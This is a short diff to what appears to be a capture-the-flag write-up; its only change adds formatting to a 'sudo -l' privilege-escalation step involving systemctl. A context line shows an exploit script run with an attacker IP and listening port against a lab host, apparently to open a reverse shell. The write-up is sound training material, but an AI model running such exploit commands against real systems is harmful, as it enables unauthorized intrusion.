@@ -111,7 +111,7 @@ python3 exploit.py <your-ip-address> <listening-port> http://10.10.11.224:5555/<
 
 # Root Flag : 
 
-* Now, moving on to privilege escalation part, I ran sudo -l and found that I could execute ``systemctl`` as the root user.
+* Now, moving on to privilege escalation part, I ran ``sudo -l`` and found that I could execute ``systemctl`` as the root user.
 
 ![sau9](/images/sau9.png)
 
